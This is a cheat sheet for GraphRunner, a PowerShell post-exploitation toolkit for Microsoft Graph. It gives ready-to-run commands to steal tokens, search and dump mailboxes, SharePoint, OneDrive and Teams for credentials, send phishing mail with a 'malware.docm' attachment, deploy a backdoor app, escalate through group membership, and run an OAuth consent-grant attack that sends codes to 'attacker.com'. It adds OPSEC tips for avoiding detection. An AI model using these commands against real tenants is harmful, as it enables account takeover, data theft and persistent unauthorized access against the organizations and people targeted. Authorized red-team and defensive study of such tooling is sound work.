# GraphRunner

**Type:** PowerShell Module + HTML GUI + PHP Redirector
**Purpose:** Post-exploitation toolset for Microsoft Graph API
**Platform:** Windows, Linux (PowerShell Core)
**Tags:** #graph-api #powershell #post-exploitation #exfiltration #persistence #oauth #consent-grant #teams #sharepoint

---

## Installation & Setup

```powershell
# Clone repository
git clone https://github.com/dafthack/GraphRunner.git
cd GraphRunner

# Import module
Import-Module .\GraphRunner.ps1

# Verify installation
Get-Command -Module GraphRunner
```

---

## Quick Reference (Most Common Commands)

```powershell
# Get tokens via device code
Get-GraphTokens

# Search emails
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password"

# Search OneDrive/SharePoint
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "confidential"

# Search Teams messages
Invoke-SearchTeams -Tokens $tokens -SearchTerm "credentials"

# Dump emails
Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $tokens.access_token -mailFolder inbox

# Start HTML GUI
Invoke-GraphRunner -Tokens $tokens
```

---

## CRED: Token Acquisition

### CRED: Get Tokens via Device Code
**Use Case:** Obtain initial access tokens

```powershell
# Interactive device code flow
Get-GraphTokens

# User is prompted to visit microsoft.com/devicelogin
# After authentication, tokens are returned

# Tokens stored in $tokens variable automatically
```

### CRED: Get Tokens with Credentials
**Use Case:** Non-interactive token acquisition

```powershell
# Username and password
Get-GraphTokens -UserPasswordAuth -Username "user@company.com" -Password "P@ssw0rd!"

# With MFA (will prompt)
Get-GraphTokens -UserPasswordAuth -Username "user@company.com" -Password "P@ssw0rd!"
```

### CRED: Service Principal Tokens
**Use Case:** Authenticate as application/service principal

```powershell
# With client secret
Get-GraphTokens -ClientSecret -ClientID "app-id" -ClientSecret "secret" -TenantID "tenant-id"

# With certificate
Get-GraphTokens -Certificate -ClientID "app-id" -CertificateFile "cert.pfx" -CertificatePassword "certpass" -TenantID "tenant-id"
```

### CRED: Refresh Tokens
**Use Case:** Keep tokens fresh automatically

```powershell
# Auto-refresh tokens
Invoke-RefreshGraphTokens -Tokens $tokens

# Continuously refresh in background
# GraphRunner automatically refreshes tokens as needed
```

---

## EXFIL: Email Operations

### EXFIL: Search Mailbox
**Use Case:** Search for sensitive terms in emails

```powershell
# Search for specific term
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password"

# Multiple search terms
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password,secret,confidential"

# Search in specific folder
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "credentials" -FolderName "Sent Items"

# Export results
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -OutputFile results.txt
```

### EXFIL: Dump Mailbox
**Use Case:** Export all emails from folder

```powershell
# Dump inbox
Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $tokens.access_token -mailFolder inbox

# Dump sent items
Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $tokens.access_token -mailFolder sentitems

# Dump all folders
Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $tokens.access_token -mailFolder all

# Save to file
Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $tokens.access_token -mailFolder inbox -OutputFile inbox-dump.txt
```

### EXFIL: Send Email as User
**Use Case:** Send phishing emails from compromised account

```powershell
# Send email
Invoke-SendOWAMailMessage -Tokens $tokens -Recipient "target@company.com" -Subject "Urgent" -Body "Please click here..."

# With attachment
Invoke-SendOWAMailMessage -Tokens $tokens -Recipient "target@company.com" -Subject "Report" -Body "See attached" -AttachmentPath "malware.docm"

# Multiple recipients
Invoke-SendOWAMailMessage -Tokens $tokens -Recipient "user1@company.com,user2@company.com" -Subject "Update" -Body "..."
```

---

## EXFIL: SharePoint & OneDrive

### EXFIL: Search SharePoint/OneDrive
**Use Case:** Find sensitive files

```powershell
# Search for term
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "confidential"

# Multiple terms
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "password,secret,api key"

# Search for file types
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "*.xlsx"
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "*.docx"

# Export results
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "password" -OutputFile sharepoint-results.txt
```

### EXFIL: Download Files
**Use Case:** Download files from OneDrive/SharePoint

```powershell
# Download specific file
Invoke-DownloadFile -Tokens $tokens -FileURL "https://company-my.sharepoint.com/personal/user/Documents/passwords.xlsx" -OutputFile passwords.xlsx

# Download all search results
# First search, then download each file
$results = Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "password"
# Parse results and download
```

---

## EXFIL: Microsoft Teams

### EXFIL: Search Teams Messages
**Use Case:** Search Teams chats and channels

```powershell
# Search all Teams conversations
Invoke-SearchTeams -Tokens $tokens -SearchTerm "password"

# Search for credentials
Invoke-SearchTeams -Tokens $tokens -SearchTerm "credentials,api key,token"

# Export results
Invoke-SearchTeams -Tokens $tokens -SearchTerm "sensitive" -OutputFile teams-results.txt
```

### EXFIL: Export Teams Conversations
**Use Case:** Dump full Teams chat history

```powershell
# Export all chats
Invoke-DumpTeams -Tokens $tokens

# Export specific team
Invoke-DumpTeams -Tokens $tokens -TeamID "team-id"

# Export to file
Invoke-DumpTeams -Tokens $tokens -OutputFile teams-dump.txt
```

---

## ENUM: Reconnaissance

### ENUM: User Enumeration
**Use Case:** List and search users

```powershell
# Get all users
Invoke-GetUsers -Tokens $tokens

# Search user attributes
Invoke-SearchUserAttributes -Tokens $tokens -SearchTerm "admin"

# Get user details
Invoke-GetUserDetails -Tokens $tokens -UserID "user@company.com"

# Export users
Invoke-GetUsers -Tokens $tokens -OutputFile users.txt
```

### ENUM: Group Enumeration
**Use Case:** Discover and analyze groups

```powershell
# Get all groups
Invoke-GetGroups -Tokens $tokens

# Find modifiable groups
Invoke-FindModifiableGroups -Tokens $tokens

# Find groups with membership rules that can be abused
Invoke-FindDynamicGroupAbuse -Tokens $tokens

# Get group members
Invoke-GetGroupMembers -Tokens $tokens -GroupID "group-id"
```

### ENUM: Application Enumeration
**Use Case:** Discover applications and permissions

```powershell
# Get app registrations
Invoke-GetAppRegistrations -Tokens $tokens

# Get external apps (third-party apps with consent)
Invoke-GetExternalApps -Tokens $tokens

# Identify potentially malicious apps
Invoke-FindMaliciousApps -Tokens $tokens

# Dump app permissions and scopes
Invoke-DumpAppPermissions -Tokens $tokens
```

### ENUM: Conditional Access Policies
**Use Case:** Identify security gaps

```powershell
# Dump all CA policies
Invoke-DumpConditionalAccessPolicies -Tokens $tokens

# Export to file
Invoke-DumpConditionalAccessPolicies -Tokens $tokens -OutputFile ca-policies.json

# Analyze for weaknesses
```

### ENUM: Exposed Mailboxes
**Use Case:** Find misconfigured mailboxes

```powershell
# Discover exposed mailboxes
Invoke-FindExposedMailboxes -Tokens $tokens

# May find mailboxes accessible without proper permissions
```

---

## PERSIST: Persistence Mechanisms

### PERSIST: Deploy Malicious Application
**Use Case:** Register backdoor application

```powershell
# Deploy malicious app
Invoke-DeployMaliciousApp -Tokens $tokens -AppName "Legitimate Service"

# App will have permissions to access user data
# Can be used for long-term access
```

### PERSIST: Clone Security Group
**Use Case:** Watering hole attack via group cloning

```powershell
# Clone a security group
Invoke-CloneSecurityGroup -Tokens $tokens -GroupID "target-group-id" -NewGroupName "IT Support Team"

# Add users to cloned group
# Use for social engineering/watering hole attacks
```

### PERSIST: Modify Group Membership
**Use Case:** Add yourself to privileged groups

```powershell
# Add user to group
Invoke-AddGroupMember -Tokens $tokens -GroupID "admin-group-id" -UserID "attacker@company.com"

# If group is modifiable by current user
# Use Invoke-FindModifiableGroups first
```

---

## EXEC: OAuth & Consent Grant Attacks

### EXEC: OAuth Code Harvesting
**Use Case:** Capture OAuth authorization codes

```powershell
# Set up PHP redirector (included in repo)
# Deploy oauth-redirect.php to your server

# Generate OAuth consent URL
Invoke-GenerateConsentURL -ClientID "your-malicious-app-id" -RedirectURI "https://yourserver.com/oauth-redirect.php"

# Send URL to victim
# When they consent, code is captured by redirector

# Exchange code for tokens
Invoke-ExchangeOAuthCode -Code "captured-code" -ClientID "app-id" -ClientSecret "secret"
```

### EXEC: Complete OAuth Flow
**Use Case:** Full consent grant attack

```powershell
# Register malicious app (via Azure Portal or API)
# Configure redirect URI to your server

# Generate and send consent link
$url = Invoke-GenerateConsentURL -ClientID "app-id" -RedirectURI "https://attacker.com/callback"

# Deploy PHP redirector to capture auth code
# oauth-redirect.php included with GraphRunner

# Exchange captured code for tokens
Invoke-ExchangeOAuthCode -Code $code -ClientID "app-id" -ClientSecret "secret"
```

---

## GUI: HTML Interface

### GUI: Launch GraphRunner GUI
**Use Case:** Interactive web-based pillaging interface

```powershell
# Launch GUI with tokens
Invoke-GraphRunner -Tokens $tokens

# Opens browser with Graph API GUI
# Features:
# - Email search and export
# - OneDrive/SharePoint browsing
# - Teams message viewing
# - User/group enumeration
# - File downloads
# - No dependencies required (pure HTML/JS)
```

### GUI: Features
- Browse emails interactively
- Search and download files
- View Teams conversations
- Navigate SharePoint sites
- User-friendly interface
- Works offline (static HTML)
- Leverages Graph API directly

---

## Attack Patterns

### Pattern: Token Theft → Full Exfiltration
```powershell
# 1. Obtain tokens
Get-GraphTokens

# 2. Search for sensitive data
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password,credentials,secret"
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "confidential,password"
Invoke-SearchTeams -Tokens $tokens -SearchTerm "api key,token"

# 3. Dump everything
Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $tokens.access_token -mailFolder all -OutputFile emails.txt
Invoke-DumpTeams -Tokens $tokens -OutputFile teams.txt

# 4. Download sensitive files
# Parse search results and download files
```

### Pattern: Reconnaissance → Privilege Escalation
```powershell
# 1. Get tokens
Get-GraphTokens

# 2. Enumerate environment
Invoke-GetUsers -Tokens $tokens
Invoke-GetGroups -Tokens $tokens
Invoke-DumpConditionalAccessPolicies -Tokens $tokens

# 3. Find modifiable groups
Invoke-FindModifiableGroups -Tokens $tokens

# 4. Add yourself to privileged group
Invoke-AddGroupMember -Tokens $tokens -GroupID "privileged-group-id" -UserID "attacker@company.com"

# 5. Refresh tokens to get new permissions
Invoke-RefreshGraphTokens -Tokens $tokens
```

### Pattern: Consent Grant → Persistent Access
```powershell
# 1. Register malicious app (via Azure Portal)
# Set permissions: Mail.Read, Files.Read.All, Chat.Read

# 2. Generate consent URL
$url = Invoke-GenerateConsentURL -ClientID "malicious-app-id" -RedirectURI "https://attacker.com/callback"

# 3. Phish user with consent link
# "Please authorize this security scan tool..."

# 4. Capture auth code with PHP redirector

# 5. Exchange for tokens
Invoke-ExchangeOAuthCode -Code $code -ClientID "app-id" -ClientSecret "secret"

# 6. Access persists even if user password changes
# Tokens can be refreshed for months/years
```

### Pattern: GUI-Based Pillaging
```powershell
# 1. Obtain tokens
Get-GraphTokens

# 2. Launch GUI
Invoke-GraphRunner -Tokens $tokens

# 3. Use web interface to:
# - Browse and download emails
# - Search SharePoint for sensitive files
# - Export Teams conversations
# - Navigate OneDrive
# - All point-and-click, no commands needed
```

---

## Pro Tips

💡 **Token Refresh**: GraphRunner auto-refreshes tokens to keep sessions alive
💡 **No Dependencies**: Doesn't require external modules - just PowerShell
💡 **Cross-Platform**: Works on Windows and Linux with PowerShell Core
💡 **GUI Advantage**: HTML GUI easier for non-technical operators
💡 **Search Smart**: Use targeted search terms (password, secret, confidential, api key)
💡 **Teams Gold**: Teams often contains credentials shared in conversations
💡 **SharePoint Treasure**: SharePoint commonly has config files with secrets
💡 **App Permissions**: Malicious apps can access data without user interaction
💡 **Dynamic Groups**: Look for dynamic group rules that can be abused
💡 **CA Policies**: Dump CA policies to find security gaps
💡 **Watering Hole**: Clone groups for targeted phishing campaigns

---

## Module Categories

**Token Management:**
- Get-GraphTokens
- Invoke-RefreshGraphTokens
- Invoke-ExchangeOAuthCode

**Email:**
- Invoke-SearchMailbox
- Invoke-DumpOWAMailboxViaMSGraphApi
- Invoke-SendOWAMailMessage

**Files:**
- Invoke-SearchSharePointAndOneDrive
- Invoke-DownloadFile

**Teams:**
- Invoke-SearchTeams
- Invoke-DumpTeams

**Enumeration:**
- Invoke-GetUsers
- Invoke-GetGroups
- Invoke-SearchUserAttributes
- Invoke-GetAppRegistrations
- Invoke-DumpConditionalAccessPolicies

**Persistence:**
- Invoke-DeployMaliciousApp
- Invoke-CloneSecurityGroup
- Invoke-AddGroupMember

**Privilege Escalation:**
- Invoke-FindModifiableGroups
- Invoke-FindDynamicGroupAbuse

**Discovery:**
- Invoke-FindExposedMailboxes
- Invoke-FindMaliciousApps

**GUI:**
- Invoke-GraphRunner

---

## OPSEC Considerations

⚠️ **High Risk:**
- Deploying malicious applications (logged, may alert SOC)
- Sending emails from compromised accounts
- Modifying group memberships
- Bulk data exfiltration

⚠️ **Medium Risk:**
- Extensive searches (many Graph API calls)
- Downloading large numbers of files
- Accessing resources outside normal user behavior

✅ **Lower Risk:**
- Basic enumeration (matches normal user activity)
- Targeted searches (small number of queries)
- Using GUI (looks like normal Graph API usage)
- Token refresh (normal OAuth behavior)

**Detection Vectors:**
- Azure AD audit logs
- Graph API usage logs
- Unusual application consent events
- New application registrations
- Group membership changes
- Mass data access patterns
- Downloads from unusual locations
- OAuth token grants

---

## Graph API Permissions

### Common Delegated Permissions Used

```
Mail.Read - Read user mail
Mail.ReadWrite - Read and write user mail
Mail.Send - Send mail as user
Files.Read.All - Read all files user can access
Files.ReadWrite.All - Read and write files
Chat.Read - Read Teams messages
Chat.ReadWrite - Read and write Teams messages
User.Read.All - Read all users
Group.Read.All - Read all groups
Directory.Read.All - Read directory data
```

### Application Permissions (Service Principal)

```
Mail.Read - Read all mailboxes
Files.Read.All - Read all files in organization
Chat.Read.All - Read all chat messages
User.Read.All - Read all users
Group.Read.All - Read all groups
```

---

## Resources

- GitHub: https://github.com/dafthack/GraphRunner
- Wiki: https://github.com/dafthack/GraphRunner/wiki
- Author: @dafthack (Beau Bullock)
- Microsoft Graph API Docs: https://docs.microsoft.com/en-us/graph/
- Graph Explorer: https://developer.microsoft.com/en-us/graph/graph-explorer
